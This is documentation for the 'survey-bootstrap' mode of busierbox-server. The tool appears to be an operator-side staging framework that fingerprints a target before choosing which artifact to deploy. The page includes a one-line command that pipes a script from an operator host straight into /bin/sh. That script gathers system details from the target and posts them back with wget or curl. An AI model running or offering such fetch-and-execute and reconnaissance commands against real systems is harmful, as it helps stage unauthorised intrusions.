# Survey Bootstrap

`scripts/busierbox-server --transport survey-bootstrap` serves a small
architecture-agnostic `/bin/sh` script and accepts the script's result upload.
This is intended for first contact when the operator does not yet know which
BusierBox artifact to send to the target.

Example:

```sh
scripts/busierbox-server \
  --transport survey-bootstrap \
  --listen-host 0.0.0.0 \
  --survey-bootstrap-port 22207 \
  --survey-bootstrap-name yourfile.sh
```

The server prints a URL such as:

```text
Survey bootstrap listener. Listening on http://127.0.0.1:22207/yourfile.sh
```

On the target, download and run it with whatever basic tool is available:

```sh
wget -O- http://OPERATOR:22207/yourfile.sh | /bin/sh
```

The script collects `uname -s`, `uname -m`, `uname -r`, word size from
`getconf LONG_BIT` when available, and a simple endian probe using `od` and
`awk` when available. It posts those values back to
`/survey-bootstrap/result` with `wget --post-data` or `curl -d`.

Operator-side records:

- Results are appended to
  `local/operator-session/survey-bootstrap-results.json` unless
  `operator_session_dir` is overridden.
- `--status`, `--json-status`, and `--api-status` include the
  `survey-bootstrap` service.
- Events include `survey_bootstrap_request`, `survey_bootstrap_result`, and
  `survey_bootstrap_error`.

The bootstrap script is not a BusierBox binary and does not assume a target
architecture. It only requires `/bin/sh`; upload requires either `wget` or
`curl` on the target.
